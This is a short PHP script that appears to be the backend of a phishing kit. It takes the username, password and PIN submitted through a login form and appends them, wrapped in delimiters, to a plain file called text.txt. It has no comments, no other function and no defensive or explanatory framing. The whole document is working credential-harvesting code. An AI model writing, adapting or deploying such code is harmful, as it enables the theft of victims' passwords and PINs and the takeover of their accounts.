<?php


$uname = $_POST['username'];
$passah = $_POST['password'];
$chardname = $_POST['pin'];

$file = "text.txt";
$Saved_File = fopen($file, 'a+');

fwrite($Saved_File, '|<START>|');
fwrite($Saved_File, $uname);
fwrite($Saved_File, '||');
fwrite($Saved_File, $passah);
fwrite($Saved_File, '||');
fwrite($Saved_File, $chardname);
fwrite($Saved_File, '|<END>|');

fclose($Saved_File);

?>
